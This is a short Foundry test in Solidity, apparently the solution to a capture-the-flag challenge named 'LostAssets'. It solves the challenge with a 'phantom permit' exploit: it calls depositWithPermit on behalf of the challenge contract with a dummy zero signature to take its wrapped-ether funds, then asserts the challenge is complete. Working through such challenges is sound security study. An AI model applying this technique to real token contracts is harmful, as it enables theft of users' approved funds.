// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../src/05.challenge/LostAssets.sol";

contract attackTest is Test {
    LostAssets lostAssets;
    MockWETH public WETH;
    MocksWETH public sWETH;

    function setUp() public{
        lostAssets = new LostAssets{value: 1 ether}();
        WETH = lostAssets.WETH();
        sWETH = lostAssets.sWETH();
    }

    function test_isComplete() public{
        sWETH.depositWithPermit(address(lostAssets), 0.5 ether, 99999999999, 1, 0x00, 0x00, address(this));
        assertEq(lostAssets.isComplete(),true);
    }

}
